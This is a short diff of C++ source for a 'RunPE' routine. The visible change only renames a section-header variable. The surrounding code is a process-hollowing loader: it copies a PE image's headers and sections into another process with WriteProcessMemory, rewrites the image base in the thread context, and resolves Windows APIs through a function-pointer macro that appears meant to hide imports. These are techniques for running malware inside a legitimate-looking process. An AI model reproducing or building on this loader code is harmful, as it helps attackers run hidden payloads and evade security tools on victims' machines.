@@ -9,7 +9,7 @@ void RunPE::RunExecutable(std::vector<char>& Image, LPCSTR CmdLine) {
 
     PIMAGE_DOS_HEADER dosHeader = PIMAGE_DOS_HEADER{};
     PIMAGE_NT_HEADERS64 ntHeaders = PIMAGE_NT_HEADERS64{};
-    PIMAGE_SECTION_HEADER SectionHeader = PIMAGE_SECTION_HEADER{};
+    PIMAGE_SECTION_HEADER sectionHeader = PIMAGE_SECTION_HEADER{};
 
     STARTUPINFOA startupInfo = STARTUPINFOA{};
     memset(&startupInfo, 0, sizeof(startupInfo));
@@ -43,8 +43,8 @@ void RunPE::RunExecutable(std::vector<char>& Image, LPCSTR CmdLine) {
     GET_FUNCTION_PTR(WriteProcessMemory)(processInfo.hProcess, imageBase, image, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
     for (auto i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-        SectionHeader = PIMAGE_SECTION_HEADER(reinterpret_cast<ULONGLONG>(image) + dosHeader->e_lfanew + 0x108 + (i * 0x28));
-        GET_FUNCTION_PTR(WriteProcessMemory)(processInfo.hProcess, LPVOID(ULONGLONG(imageBase) + SectionHeader->VirtualAddress), LPVOID(ULONGLONG(image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL);
+        sectionHeader = PIMAGE_SECTION_HEADER(reinterpret_cast<ULONGLONG>(image) + dosHeader->e_lfanew + 0x108 + (i * 0x28));
+        GET_FUNCTION_PTR(WriteProcessMemory)(processInfo.hProcess, LPVOID(ULONGLONG(imageBase) + sectionHeader->VirtualAddress), LPVOID(ULONGLONG(image) + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, NULL);
         GET_FUNCTION_PTR(WriteProcessMemory)(processInfo.hProcess, LPVOID(ctx->Rdx + 0x10), LPVOID(&ntHeaders->OptionalHeader.ImageBase), 0x8, NULL);
     }
 
